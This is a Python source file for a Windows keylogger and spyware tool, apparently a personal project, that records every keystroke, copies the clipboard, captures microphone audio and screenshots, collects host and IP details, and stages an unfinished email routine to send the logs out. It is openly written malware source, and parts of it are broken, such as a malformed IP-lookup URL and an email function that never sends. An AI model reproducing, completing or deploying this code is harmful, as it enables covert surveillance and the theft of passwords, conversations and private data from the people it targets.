# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"

system_information = "system_info.txt"

clipboard_information = " clipboard.txt"

audio_information = "audio.wav"

microphone_time = 10

screenshot_information = "screenshot.png"

email_address = "enter your email address"
password = "enter your password"
to_address = "To whom are you sending the email"

file_path = "C:\\Users\\Brian\\PycharmProjects\\Key logger 1"
extend = "\\"


# Function to send the email
def send_email(filename, attachment, to_address):
    from_address = "email_address"
    msg = MIMEMultipart()
    msg['from'] = from_address
    msg['To'] = to_address
    msg['Subject'] = "Log File"
    body = "Body_from_the_email"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment)


send_email(keys_information, file_path + extend + keys_information, to_address)


def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        host_name = socket.gethostname()
        IP_Address = socket.gethostbyname(host_name)
        try:
            public_ip = get("https:api.ipify.org").text
            f.write("public IP Address : " + public_ip)

        except Exception:
            f.write("We could not get the public IP Address(most likely because of maximum query)")

        f.write("Processor:" + (platform.processor()) + "\n")
        f.write("system : " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine : " + platform.machine() + "\n")
        f.write("Host name: " + host_name + "\n")
        f.write("private IP Address : " + IP_Address + "\n")


computer_information()


def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard data:  \n" + pasted_data)

        except:
            f.write(" Clipboard Could not be copied.")


copy_clipboard()


def microphone():
    fs = 44100
    seconds = microphone_time
    my_recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, fs, my_recording)


microphone()


def screenshot():
    image = ImageGrab.grab()
    image.save(file_path + extend + screenshot_information)


screenshot()

count = 0
keys = []


def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("Space") > 0:
                f.write('\n')
                f.close()

            elif k.find("key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
